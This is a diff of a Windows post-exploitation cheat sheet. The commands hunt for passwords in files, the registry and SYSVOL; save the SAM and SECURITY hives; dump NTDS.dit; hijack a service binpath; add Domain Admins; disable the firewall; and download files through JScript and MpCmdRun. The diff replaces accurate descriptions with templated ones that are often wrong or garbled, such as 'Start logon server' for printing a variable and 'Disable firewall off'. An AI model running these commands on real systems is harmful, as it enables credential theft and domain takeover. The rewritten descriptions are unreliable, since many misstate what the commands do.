@@ -4,27 +4,27 @@
 
 ### System info
 
-Print full Windows system information.
+Show system info with Windows.
 
-```cmd title:"Print Windows systeminfo"
+```cmd title:"Windows Show System Info"
 systeminfo
 ```
 <!-- cheat -->
 
 ### Hostname
 
-Print hostname.
+Run hostname with Windows.
 
-```cmd title:"Print hostname"
+```cmd title:"Windows Run Hostname"
 hostname
 ```
 <!-- cheat -->
 
 ### Computer name
 
-Print computer name from PowerShell.
+Run computer name with Windows.
 
-```powershell title:"Print computer name"
+```powershell title:"Windows Run Computer Name"
 $env:COMPUTERNAME
 ```
 <!-- cheat -->
@@ -33,18 +33,18 @@ $env:COMPUTERNAME
 
 ### Find password strings
 
-Search common document types for password strings.
+Find password strings with Windows.
 
-```cmd title:"Search files for password strings"
+```cmd title:"Windows Find Password Strings"
 findstr /si "password" *.txt *.xml *.docx
 ```
 <!-- cheat -->
 
 ### GPP cpassword
 
-Search SYSVOL policies for Group Policy Preferences cpassword values.
+Dump GPP cpassword with Windows.
 
-```cmd title:"Search SYSVOL for cpassword"
+```cmd title:"Windows Dump GPP Cpassword"
 findstr /S /I cpassword "\\$domain\sysvol\$domain\policies\*.xml"
 ```
 <!-- cheat
@@ -53,18 +53,18 @@ var domain
 
 ### Recycle Bin
 
-Recursively list Recycle Bin contents.
+List recycle bin with Windows.
 
-```cmd title:"List Recycle Bin contents"
+```cmd title:"Windows List Recycle Bin"
 dir C:\$Recycle.Bin /s /b
 ```
 <!-- cheat -->
 
 ### Hidden files
 
-List hidden files in a path.
+List hidden files with Windows.
 
-```cmd title:"List hidden files"
+```cmd title:"Windows List Hidden Files"
 dir /a:h "$path"
 ```
 <!-- cheat
@@ -73,18 +73,18 @@ var path
 
 ### Recursive list
 
-Recursively list files by full path.
+List recursive list with Windows.
 
-```cmd title:"Recursively list files"
+```cmd title:"Windows List Recursive List"
 dir /s /b
 ```
 <!-- cheat -->
 
 ### Hosts file
 
-Print the Windows hosts file.
+Run hosts file with Windows.
 
-```cmd title:"Print Windows hosts file"
+```cmd title:"Windows Run Hosts File"
 type C:\WINDOWS\System32\drivers\etc\hosts
 ```
 <!-- cheat -->
@@ -93,18 +93,18 @@ type C:\WINDOWS\System32\drivers\etc\hosts
 
 ### Scheduled tasks
 
-List scheduled tasks verbosely.
+List scheduled tasks with Windows.
 
-```cmd title:"List scheduled tasks"
+```cmd title:"Windows List Scheduled Tasks"
 schtasks /query /fo LIST /v
 ```
 <!-- cheat -->
 
 ### Find scheduled task
 
-Find a scheduled task by name.
+Find scheduled task with Windows.
 
-```cmd title:"Find scheduled task by name"
+```cmd title:"Windows Find Scheduled Task"
 schtasks /query /fo LIST 2>nul | findstr "$task_name"
 ```
 <!-- cheat
@@ -113,27 +113,27 @@ var task_name
 
 ### Processes
 
-List processes verbosely.
+List processes with Windows.
 
-```cmd title:"List processes verbosely"
+```cmd title:"Windows List Processes"
 tasklist /V
 ```
 <!-- cheat -->
 
 ### Processes with services
 
-List processes and linked services.
+List processes with services with Windows.
 
-```cmd title:"List processes and linked services"
+```cmd title:"Windows List Processes with Services"
 tasklist /SVC
 ```
 <!-- cheat -->
 
 ### Service permissions
 
-Check service permissions with accesschk.
+Check service permissions with Windows.
 
-```cmd title:"Check service permissions"
+```cmd title:"Windows Check Service Permissions"
 accesschk.exe /accepteula -ucqv "$service_name"
 ```
 <!-- cheat
@@ -142,9 +142,9 @@ var service_name
 
 ### Reconfigure service command
 
-Set a service binary path to a command.
+Enumerate reconfigure service command with Windows.
 
-```cmd title:"Set service binary path"
+```cmd title:"Windows Enumerate Reconfigure Service Command"
 sc config "$service_name" binpath= "$command"
 ```
 <!-- cheat
@@ -154,9 +154,9 @@ var command
 
 ### Start service
 
-Start a service.
+Start service with Windows.
 
-```cmd title:"Start Windows service"
+```cmd title:"Windows Start Service"
 net start "$service_name"
 ```
 <!-- cheat
@@ -167,36 +167,36 @@ var service_name
 
 ### Winlogon
 
-Query Winlogon registry values.
+Enumerate winlogon with Windows.
 
-```cmd title:"Query Winlogon registry values"
+```cmd title:"Windows Enumerate Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
 <!-- cheat -->
 
 ### HKLM password search
 
-Search HKLM registry strings for password.
+Dump HKLM password search with Windows.
 
-```cmd title:"Search HKLM registry for password"
+```cmd title:"Windows Dump HKLM Password Search"
 reg query HKLM /f password /t REG_SZ /s
 ```
 <!-- cheat -->
 
 ### HKCU password search
 
-Search HKCU registry strings for password.
+Dump HKCU password search with Windows.
 
-```cmd title:"Search HKCU registry for password"
+```cmd title:"Windows Dump HKCU Password Search"
 reg query HKCU /f password /t REG_SZ /s
 ```
 <!-- cheat -->
 
 ### Save hives
 
-Save SAM, SECURITY, and SYSTEM hives.
+Run save hives with Windows.
 
-```cmd title:"Save SAM SECURITY SYSTEM hives"
+```cmd title:"Windows Run Save Hives"
 reg save HKLM\SAM C:\Windows\Temp\sam.save
 reg save HKLM\SECURITY C:\Windows\Temp\security.save
 reg save HKLM\SYSTEM C:\Windows\Temp\system.save
@@ -207,18 +207,18 @@ reg save HKLM\SYSTEM C:\Windows\Temp\system.save
 
 ### Whoami privileges
 
-Print current privileges.
+Enumerate whoami privileges with Windows.
 
-```cmd title:"Print whoami privileges"
+```cmd title:"Windows Enumerate Whoami Privileges"
 whoami /priv
 ```
 <!-- cheat -->
 
 ### User info
 
-Show local user information.
+Show user info with Windows.
 
-```cmd title:"Show local user info"
+```cmd title:"Windows Show User Info"
 net user "$target_user"
 ```
 <!-- cheat
@@ -227,9 +227,9 @@ var target_user
 
 ### Add local user
 
-Create a local user.
+Add local user with Windows.
 
-```cmd title:"Create local user"
+```cmd title:"Windows Add Local User"
 net user "$target_user" "$target_pass" /ADD
 ```
 <!-- cheat
@@ -239,9 +239,9 @@ var target_pass
 
 ### Add local admin
 
-Add a user to local administrators.
+Add local admin with Windows.
 
-```cmd title:"Add user to local administrators"
+```cmd title:"Windows Add Local Admin"
 net localgroup administrators "$target_user" /add
 ```
 <!-- cheat
@@ -250,9 +250,9 @@ var target_user
 
 ### Runas
 
-Run cmd as another user.
+Execute runas with Windows.
 
-```cmd title:"Run cmd as another user"
+```cmd title:"Windows Execute Runas"
 runas /user:$domain\$user cmd.exe
 ```
 <!-- cheat
@@ -262,9 +262,9 @@ var user
 
 ### Local group members
 
-List members of a local group.
+List local group members with Windows.
 
-```cmd title:"List local group members"
+```cmd title:"Windows List Local Group Members"
 net localgroup "$group_name"
 ```
 <!-- cheat
@@ -275,45 +275,45 @@ var group_name
 
 ### Domain DNS
 
-Query domain DNS records from `%USERDNSDOMAIN%`.
+Enumerate domain DNS with Windows.
 
-```cmd title:"Query current domain DNS records"
+```cmd title:"Windows Enumerate Domain DNS"
 nslookup -type=any %USERDNSDOMAIN%.
 ```
 <!-- cheat -->
 
 ### Domain name
 
-Print NetBIOS domain.
+Run domain name with Windows.
 
-```cmd title:"Print USERDOMAIN"
+```cmd title:"Windows Run Domain Name"
 echo %USERDOMAIN%
 ```
 <!-- cheat -->
 
 ### Domain FQDN
 
-Print DNS domain.
+Run domain FQDN with Windows.
 
-```cmd title:"Print USERDNSDOMAIN"
+```cmd title:"Windows Run Domain FQDN"
 echo %USERDNSDOMAIN%
 ```
 <!-- cheat -->
 
 ### Logon server
 
-Print logon server.
+Start logon server with Windows.
 
-```cmd title:"Print LOGONSERVER"
+```cmd title:"Windows Start Logon Server"
 echo %LOGONSERVER%
 ```
 <!-- cheat -->
 
 ### Domain user info
 
-Show domain user info.
+Show domain user info with Windows.
 
-```cmd title:"Show domain user info"
+```cmd title:"Windows Show Domain User Info"
 net user "$target_user" /domain
 ```
 <!-- cheat
@@ -322,9 +322,9 @@ var target_user
 
 ### Add Domain Admin
 
-Add a user to Domain Admins.
+Add domain admin with Windows.
 
-```cmd title:"Add user to Domain Admins"
+```cmd title:"Windows Add Domain Admin"
 net group "Domain Admins" "$target_user" /add /domain
 ```
 <!-- cheat
@@ -333,9 +333,9 @@ var target_user
 
 ### Domain controllers
 
-List domain controllers.
+List domain controllers with Windows.
 
-```cmd title:"List domain controllers"
+```cmd title:"Windows List Domain Controllers"
 nltest /dclist:$domain
 ```
 <!-- cheat
@@ -344,18 +344,18 @@ var domain
 
 ### Domain trusts
 
-List domain trust relationships.
+List domain trusts with Windows.
 
-```cmd title:"List domain trusts"
+```cmd title:"Windows List Domain Trusts"
 nltest /domain_trusts
 ```
 <!-- cheat -->
 
 ### Enable SID history
 
-Enable SID history on a trust.
+Enable SID history with Windows.
 
-```cmd title:"Enable SID history on trust"
+```cmd title:"Windows Enable SID History"
 netdom trust "$source_domain" /d:"$target_domain" /enablesidhistory:yes
 ```
 <!-- cheat
@@ -367,18 +367,18 @@ var target_domain
 
 ### ARP cache
 
-Print ARP cache.
+Run ARP cache with Windows.
 
-```cmd title:"Print ARP cache"
+```cmd title:"Windows Run ARP Cache"
 arp -a
 ```
 <!-- cheat -->
 
 ### Domain shares
 
-List domain shares.
+List domain shares with Windows.
 
-```cmd title:"List domain shares"
+```cmd title:"Windows List Domain Shares"
 net view /all /domain "$domain"
 ```
 <!-- cheat
@@ -387,9 +387,9 @@ var domain
 
 ### Host shares
 
-List shares on a host.
+List host shares with Windows.
 
-```cmd title:"List shares on host"
+```cmd title:"Windows List Host Shares"
 net view "\\$rhost_name" /ALL
 ```
 <!-- cheat
@@ -398,9 +398,9 @@ var rhost_name
 
 ### Mount share
 
-Mount an SMB share to `x:`.
+Mount share with Windows.
 
-```cmd title:"Mount SMB share to drive x"
+```cmd title:"Windows Mount Share"
 net use x: "\\$rhost_name\$share"
 ```
 <!-- cheat
@@ -412,36 +412,36 @@ var share
 
 ### Firewall state
 
-Show firewall state.
+Show firewall state with Windows.
 
-```cmd title:"Show firewall state"
+```cmd title:"Windows Show Firewall State"
 netsh advfirewall show allprofiles
 ```
 <!-- cheat -->
 
 ### Firewall off
 
-Disable Windows Firewall for all profiles.
+Disable firewall off with Windows.
 
-```cmd title:"Disable Windows Firewall"
+```cmd title:"Windows Disable Firewall Off"
 netsh advfirewall set allprofiles state off
 ```
 <!-- cheat -->
 
 ### Firewall on
 
-Enable Windows Firewall for all profiles.
+Enable firewall on with Windows.
 
-```cmd title:"Enable Windows Firewall"
+```cmd title:"Windows Enable Firewall on"
 netsh advfirewall set allprofiles state on
 ```
 <!-- cheat -->
 
 ### Open RDP
 
-Open RDP on the firewall.
+Run open RDP with Windows.
 
-```cmd title:"Open RDP firewall rule"
+```cmd title:"Windows Run Open RDP"
 netsh firewall add portopening TCP 3389 "Remote Desktop"
 ```
 <!-- cheat -->
@@ -450,36 +450,36 @@ netsh firewall add portopening TCP 3389 "Remote Desktop"
 
 ### Create shadow copy
 
-Create a shadow copy for `C:`.
+Create shadow copy with Windows.
 
-```cmd title:"Create C drive shadow copy"
+```cmd title:"Windows Create Shadow Copy"
 wmic shadowcopy call create Volume='C:\'
 ```
 <!-- cheat -->
 
 ### List shadow copies
 
-List volume shadow copies.
+List shadow copies with Windows.
 
-```cmd title:"List volume shadow copies"
+```cmd title:"Windows List Shadow Copies"
 vssadmin list shadows
 ```
 <!-- cheat -->
 
 ### IFM NTDS dump
 
-Create an IFM copy of AD DS.
+Dump IFM NTDS dump with Windows.
 
-```cmd title:"Create IFM NTDS dump"
+```cmd title:"Windows Dump IFM NTDS Dump"
 ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
 ```
 <!-- cheat -->
 
 ### Copy NTDS with VSS
 
-Copy `ntds.dit` via VSS.
+Copy NTDS with VSS with Windows.
 
-```cmd title:"Copy ntds.dit with VSS"
+```cmd title:"Windows Copy NTDS with VSS"
 esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 ```
 <!-- cheat -->
@@ -488,9 +488,9 @@ esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 
 ### JScript download
 
-Download a file with WinHttpRequest through cscript.
+Download JScript download with Windows.
 
-```cmd title:"Download file with JScript WinHttpRequest"
+```cmd title:"Windows Download JScript Download"
 echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js "$url" > "$output_file"
 ```
 <!-- cheat
@@ -500,9 +500,9 @@ var output_file
 
 ### Defender download
 
-Download a file with MpCmdRun.
+Download defender download with Windows.
 
-```cmd title:"Download file with MpCmdRun"
+```cmd title:"Windows Download Defender Download"
 mpcmdrun.exe -DownloadFile -url "$url" -path "$output_file"
 ```
 <!-- cheat
